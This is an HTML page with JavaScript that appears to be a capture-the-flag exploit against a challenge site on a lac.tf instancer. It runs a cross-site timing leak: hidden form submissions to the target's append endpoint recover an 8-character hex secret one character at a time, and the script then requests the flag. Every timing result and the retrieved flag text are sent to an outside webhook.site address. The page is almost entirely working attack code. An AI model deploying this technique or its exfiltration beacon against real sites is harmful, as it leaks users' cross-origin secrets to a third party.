<!DOCTYPE html>
<html>
<head><title>XS-Leak Object</title></head>
<body>
<div id="s">Loading...</div>
<script>
const TARGET = "https://append-note-czwfe.instancer.lac.tf";
const WEBHOOK = "https://webhook.site/8d1c26f6-b45d-4cea-b285-463ff4706cbd";
const CHARS = "0123456789abcdef";

const sleep = ms => new Promise(r => setTimeout(r, ms));
const report = d => {
    navigator.sendBeacon(WEBHOOK, d);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
};
const status = s => document.getElementById('s').textContent = s;

// One-shot oracle using timing with performance API
async function testPrefix(prefix) {
    const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
    const wname = 'p' + Math.random().toString(36).slice(2);
    
    return new Promise(resolve => {
        // Clear performance entries
        performance.clearResourceTimings();
        
        const form = document.createElement('form');
        form.method = 'GET';
        form.action = url;
        form.target = wname;
        form.style.display = 'none';
        document.body.appendChild(form);
        
        const t0 = performance.now();
        form.submit();
        
        // Check when window becomes cross-origin (loaded)
        let checks = 0;
        const checkInterval = setInterval(() => {
            checks++;
            try {
                const w = window.open('', wname);
                if (w) {
                    try {
                        // If we can access location, still loading about:blank or same origin
                        const loc = w.location.href;
                        if (loc && loc !== 'about:blank' && !loc.startsWith(location.origin)) {
                            // Loaded different origin
                            clearInterval(checkInterval);
                            w.close();
                            resolve(performance.now() - t0);
                            return;
                        }
                    } catch(e) {
                        // Cross-origin - page loaded!
                        clearInterval(checkInterval);
                        const elapsed = performance.now() - t0;
                        try { w.close(); } catch(e2) {}
                        resolve(elapsed);
                        return;
                    }
                }
            } catch(e) {}
            
            if (checks > 100) {
                clearInterval(checkInterval);
                resolve(performance.now() - t0);
            }
        }, 10);
        
        document.body.removeChild(form);
    });
}

// Since each append adds to notes, we can only test each prefix ONCE
// Strategy: test all 16 chars for position, pick the fastest (or slowest)
async function findCharAtPosition(knownPrefix, pos) {
    status(`Testing position ${pos}...`);
    
    const results = [];
    
    for (const c of CHARS) {
        const prefix = knownPrefix + c;
        const time = await testPrefix(prefix);
        results.push({ c, time });
        report(`T${pos}_${c}:${time.toFixed(0)}`);
        await sleep(100);
    }
    
    // Sort by time
    results.sort((a, b) => a.time - b.time);
    
    // Report top and bottom
    const fastest = results[0];
    const slowest = results[results.length - 1];
    report(`P${pos}_FAST:${fastest.c}:${fastest.time.toFixed(0)}_SLOW:${slowest.c}:${slowest.time.toFixed(0)}`);
    
    // We don't know which is correct, return both
    return { fastest: fastest.c, slowest: slowest.c, results };
}

async function main() {
    report('STARTED_ONESHOT');
    status('Starting one-shot XS-Leak...');
    
    try {
        let secretFast = "";
        let secretSlow = "";
        
        for (let pos = 0; pos < 8; pos++) {
            // We test with EMPTY prefix each time to avoid cache
            // But we need to build the prefix correctly
            const result = await findCharAtPosition(secretFast, pos);
            secretFast += result.fastest;
            secretSlow += result.slowest;
            
            report(`POS${pos}:F=${secretFast},S=${secretSlow}`);
            status(`Pos ${pos}: fast=${secretFast}, slow=${secretSlow}`);
        }
        
        report(`DONE:FAST=${secretFast},SLOW=${secretSlow}`);
        
        // Try both secrets
        const r1 = await fetch(`${TARGET}/flag?secret=${secretFast}`);
        const flag1 = await r1.text();
        report(`FLAG_FAST:${flag1}`);
        
        const r2 = await fetch(`${TARGET}/flag?secret=${secretSlow}`);
        const flag2 = await r2.text();
        report(`FLAG_SLOW:${flag2}`);
        
        status(`Tried: ${secretFast} -> ${flag1}, ${secretSlow} -> ${flag2}`);
        
    } catch(e) {
        report(`ERR:${e.message}`);
    }
}

main();
</script>
</body>
</html>
